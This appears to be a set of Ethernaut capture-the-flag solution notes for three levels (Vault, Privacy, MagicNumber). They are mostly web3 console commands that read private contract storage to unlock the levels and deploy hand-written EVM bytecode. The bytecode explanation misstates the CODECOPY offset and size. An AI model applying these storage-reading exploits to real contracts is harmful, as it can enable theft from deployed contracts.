Ethernaut-8
Vault
await web3.eth.getStorageAt(contract.address,0);
'0x0000000000000000000000000000000000000000000000000000000000000001'
await web3.eth.getStorageAt(contract.address,1);
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29');



Ethernaut-12
Privacy
await web3.eth.getStorageAt(contract.address,5);
'0xca03c07d7d4db33332f667b60c547f144c461340eb1823da7ef202949b67e677'
await contract.unlock('0xca03c07d7d4db33332f667b60c547f14');




Ethernaut-18

var account = "0xDEe8dbD5ddBcAcf2a7C850B6496d18C7F22f5bDe";
var bytecode = "0x600a600c600039600a6000f3602A60005260206000F3";//602A60005260206000F3 - contract code
await web3.eth.sendTransaction({ from: account, data: bytecode }, function(err,res){console.log(res)});

await web3.eth.call({
    to: '0x7b2c89730353578d371f10b9b92082108529d9f6', 
    data: '0x650500c1'
})

await contract.setSolver('0x7b2c89730353578d371f10b9b92082108529d9f6');

0x600a600c600039600a6000f3 602A60005260206000F3
[00]	PUSH1	0a
[02]	PUSH1	0c
[04]	PUSH1	00
[06]	CODECOPY	
[07]	PUSH1	0a
[09]	PUSH1	00
[0b]	RETURN	

CODECOPY) takes the top 3 values from the stack (source offset, target offset, and size) and copies the specified number of bytes (size) of code data from the source offset to the target offset in memory. In this case, it will copy 12 bytes of code data starting from position 10 to position 0 in memory - 602A60005260206000F3

[00]	PUSH1	2A
[02]	PUSH1	00
[04]	MSTORE	
[05]	PUSH1	20
[07]	PUSH1	00
[09]	RETURN	

simply returns 32 byte 2A
